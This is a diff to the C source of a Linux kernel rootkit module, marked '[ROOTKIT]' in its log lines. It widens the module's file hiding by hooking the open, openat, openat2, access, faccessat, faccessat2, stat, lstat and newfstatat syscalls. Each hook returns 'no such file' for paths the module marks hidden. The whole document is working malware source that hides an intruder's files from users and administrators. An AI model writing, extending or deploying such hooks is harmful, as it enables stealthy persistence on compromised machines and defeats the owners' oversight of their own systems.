@@ -3,19 +3,23 @@
 #include "syscall_hooks.h"
 #include "utils.h"
 #include <linux/err.h>
+#include <linux/fcntl.h>
 #include <linux/fdtable.h>
 #include <linux/limits.h>
 #include <linux/namei.h>
+#include <linux/openat2.h>
 #include <linux/printk.h>
 #include <linux/stat.h>
 #include <linux/string.h>
 #include <linux/types.h>
 
-static long do_statx(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
-                     const char __user *const s_filename, const int i32_flags)
+static long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs,
+                            const int i32_dfd, const char __user *const s_filename,
+                            const int i32_at_flags)
 {
-    long l_ret               = 0;    // Return value of the real syscall
-    const char *s_filename_k = NULL; // Name of the file
+    long l_ret                     = 0;    // Return value of the real syscall
+    unsigned int ui32_lookup_flags = 0;    // Lookup flags used when parsing path
+    const char *s_filename_k       = NULL; // Kernel buffer for file name
 
     s_filename_k = strndup_user(s_filename, PATH_MAX);
 
@@ -28,7 +32,11 @@ static long do_statx(const sysfun_t orig_func, struct pt_regs *const p_regs, con
 
     kfree_const(s_filename_k);
 
-    IF_U (is_pathname_hidden(i32_dfd, s_filename, i32_flags)) {
+    if (!(i32_at_flags & AT_SYMLINK_NOFOLLOW)) {
+        ui32_lookup_flags |= LOOKUP_FOLLOW;
+    }
+
+    IF_U (is_pathname_hidden(i32_dfd, s_filename, ui32_lookup_flags)) {
         pr_info("[ROOTKIT]   * Hiding file\n");
 
         return -ENOENT; // No such file or directory
@@ -44,41 +52,70 @@ static long do_statx(const sysfun_t orig_func, struct pt_regs *const p_regs, con
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
-    long l_ret               = 0;    // Return value of the real syscall
-    const char *s_filename_k = NULL; // Name of the file
-    const file_t *p_file     = NULL; // File structure representing what was opened
+    pr_info("[ROOTKIT] open(%p, %#x, 0%ho)\n", s_filename, i32_flags, ui16_mode);
 
-    l_ret = orig_open(p_regs);
+    return do_check_hidden(orig_open, p_regs, AT_FDCWD, s_filename,
+                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
+}
 
-    s_filename_k = strndup_user(s_filename, PATH_MAX);
+// sys_openat syscall hook handler
+SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __user *, s_filename,
+                      int, i32_flags, umode_t, ui16_mode)
+{
+    pr_info("[ROOTKIT] openat(%d, %p, %#x, 0%ho)\n", i32_dfd, s_filename, i32_flags, ui16_mode);
 
-    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
-        pr_err("[ROOTKIT] * Could not copy filename from user\n");
-        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
+    return do_check_hidden(orig_openat, p_regs, i32_dfd, s_filename,
+                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
+}
+
+// sys_openat2 syscall hook handler
+SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __user *, s_filename,
+                      struct open_how __user *, p_how, size_t, sz_usize)
+{
+    int err;
+    struct open_how tmp_how;
+
+    pr_info("[ROOTKIT] openat2(%d, %p, %p, %zu)\n", i32_dfd, s_filename, p_how, sz_usize);
+
+    // Following code is based on fs/open.c:sys_openat2()
+
+    IF_U (sz_usize < OPEN_HOW_SIZE_VER0) {
+        return -EINVAL;
     }
 
-    pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode, l_ret);
-
-    kfree_const(s_filename_k);
-
-    // Check if the opened file is supposed to be hidden
-    p_file = fd_get_file(l_ret);
-
-    IF_U (IS_ERR_OR_NULL(p_file)) {
-        pr_err("[ROOTKIT] * Could not get file structure\n");
-    }
-    else {
-        IF_U (is_file_hidden(p_file)) {
-            pr_info("[ROOTKIT]   * Hiding file\n");
-
-            // Close the file descriptor
-            close_fd(l_ret);
-
-            return -ENOENT; // No such file or directory
-        }
+    err = copy_struct_from_user(&tmp_how, sizeof(tmp_how), p_how, sz_usize);
+    if (err != 0) {
+        return err;
     }
 
-    return l_ret;
+    return do_check_hidden(orig_openat2, p_regs, i32_dfd, s_filename,
+                           tmp_how.flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
+}
+
+// sys_access syscall hook handler
+SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filename, int, i32_mode)
+{
+    pr_info("[ROOTKIT] access(%p, 0%o)\n", s_filename, i32_mode);
+
+    return do_check_hidden(orig_access, p_regs, AT_FDCWD, s_filename, 0);
+}
+
+// sys_faccessat syscall hook handler
+SYSCALL_HOOK_HANDLER3(faccessat, orig_faccessat, p_regs, int, i32_dfd, const char __user *,
+                      s_filename, int, i32_mode)
+{
+    pr_info("[ROOTKIT] faccessat(%d, %p, 0%o)\n", i32_dfd, s_filename, i32_mode);
+
+    return do_check_hidden(orig_faccessat, p_regs, i32_dfd, s_filename, 0);
+}
+
+// sys_faccessat2 syscall hook handler
+SYSCALL_HOOK_HANDLER4(faccessat2, orig_faccessat2, p_regs, int, i32_dfd, const char __user *,
+                      s_filename, int, i32_mode, int, i32_flags)
+{
+    pr_info("[ROOTKIT] faccessat2(%d, %p, 0%o, %#x)\n", i32_dfd, s_filename, i32_mode, i32_flags);
+
+    return do_check_hidden(orig_faccessat2, p_regs, i32_dfd, s_filename, i32_flags);
 }
 
 // sys_stat syscall hook handler
@@ -87,7 +124,7 @@ SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
 {
     pr_info("[ROOTKIT] stat(%p, %p)\n", s_filename, p_statbuf);
 
-    return do_statx(orig_stat, p_regs, AT_FDCWD, s_filename, 0);
+    return do_check_hidden(orig_stat, p_regs, AT_FDCWD, s_filename, 0);
 }
 
 // sys_lstat syscall hook handler
@@ -96,5 +133,15 @@ SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename
 {
     pr_info("[ROOTKIT] lstat(%p, %p)\n", s_filename, p_statbuf);
 
-    return do_statx(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
+    return do_check_hidden(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
+}
+
+// sys_stat syscall hook handler
+SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const char __user *,
+                      s_filename, struct stat __user *, p_statbuf, int, i32_flag)
+{
+    pr_info("[ROOTKIT] newfstatat(%d, %p, %p, %d)\n", i32_dfd, s_filename, p_statbuf, i32_flag);
+
+    return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename,
+                           i32_flag | AT_NO_AUTOMOUNT);
 }
